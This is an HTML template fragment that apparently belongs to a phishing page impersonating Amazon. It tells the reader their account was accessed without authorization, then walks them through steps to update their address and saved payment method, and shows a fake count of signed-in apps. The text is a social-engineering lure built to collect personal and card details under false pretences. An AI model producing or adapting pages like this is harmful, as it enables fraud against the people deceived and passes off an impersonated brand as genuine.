<div class="container mx-auto mb-1 border border-stone-300 px-3 py-2 rounded-xl">
    <b class="text-[13px] font-500 tracking-wide">Step 1:</b>
    <span class="text-sm font-semibold">Update your address information</span>
    <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
    <p class="text-sm font-semibold mb-3">We want to inform you that your account was recently accessed without authorization. As part of our security response, we recommend that you review and update your address information to ensure its accuracy and protect your account.</p>
    <b class="text-[12px] font-500 tracking-wide">Tip:</b>
    <span class="text-xs">For your security, always double-check that your personal details are up to date.</span>
</div>

<div class="container mx-auto mb-1 border border-stone-300 px-3 py-2 rounded-xl">
    <b class="text-[13px] font-500 tracking-wide">Step 2:</b>
    <span class="text-sm font-semibold">Update your payment method</span>
    <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
    <p class="text-sm font-semibold mb-3">To help secure your account and prevent potential misuse of your billing information, we strongly recommend updating your saved payment method. This step ensures your financial data remains protected.</p>
    <b class="text-[12px] font-500 tracking-wide">Tip:</b>
    <span class="text-xs">After a security incident, updating your saved payment method helps prevent fraud. Consider using a secure credit or debit card with fraud alerts enabled.</span>
</div>

<div class="container mx-auto border border-stone-300 px-3 py-2 rounded-xl">
    <div class="max-w-[300px]">
        <b class="text-[13px] font-500 tracking-wide">Step 3:</b>
        <span class="text-sm font-semibold">Sign out all apps, devices, and web browsers</span>
    </div>
    <hr class="mb-2 mt-2 text-stone-300 max-w-[310px] flex mx-auto"/>
    <div class="flex gap-2 mb-3">
        <img class="w-[20px]" src="/public/images/warning.svg" alt="Amazon Logo" />
        <p class="text-sm font-semibold">4 app(s) signed in to your Amazon account</p>
    </div>
    <b class="text-[12px] font-500 tracking-wide">Tip:</b>
    <span class="text-xs"> For maximum security, sign out of everything. It may take up to 15 minutes to sign out of devices, apps and web browsers.</span>
    <!-- <form class="mt-5" action="" method="post" id="signout-form">
        <button type="submit" class="flex border border-stone-300 text-xs tracking-wider text-black justify-center items-center mx-auto py-2 px-4 rounded-2xl mb-4 hover:bg-stone-100 duration-150 transition h-8 w-full cursor-pointer font-semibold">
            Sign-out everything
        </button>
    </form>  -->
</div>